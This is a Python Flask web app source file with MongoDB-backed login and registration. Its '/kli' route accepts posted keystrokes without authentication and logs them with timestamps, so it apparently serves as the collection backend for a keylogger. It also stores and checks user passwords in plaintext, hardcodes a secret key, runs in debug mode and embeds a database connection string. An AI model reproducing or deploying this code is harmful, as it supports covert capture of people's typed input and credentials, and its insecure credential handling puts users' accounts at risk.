from flask import Flask, render_template, request, redirect, url_for, session
from flask_pymongo import PyMongo
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'noyoucanhavethiskey'
app.config['MONGO_URI'] = 'mongodb+srv://kldb:<password>@klick01.wawqhdc.mongodb.net/klick01?retryWrites=true&w=majority'
mongo = PyMongo(app)

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        existing_user = mongo.db.users.find_one({'username': username})
        if existing_user:
            return 'Username already exists!'
        mongo.db.users.insert_one({'username': username, 'password': password})
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = mongo.db.users.find_one({'username': username, 'password': password})
        if user:
            session['username'] = username
            return redirect(url_for('dashboard'))
        return 'Invalid username or password!'
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'username' in session:
        messages = mongo.db.messages.find()
        return render_template('dashboard.html', messages=messages)
    return redirect(url_for('login'))

@app.route('/logout', methods=['POST'])
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/kli', methods=['POST'])
def receive_keystrokes():
    data = request.json
    keystroke = data.get('keystroke')
    if keystroke:
        timestamp = datetime.now()
        mongo.db.keystrokes.insert_one({'keystroke': keystroke, 'timestamp': timestamp})
    return '', 200

if __name__ == '__main__':
    app.run(debug=True)
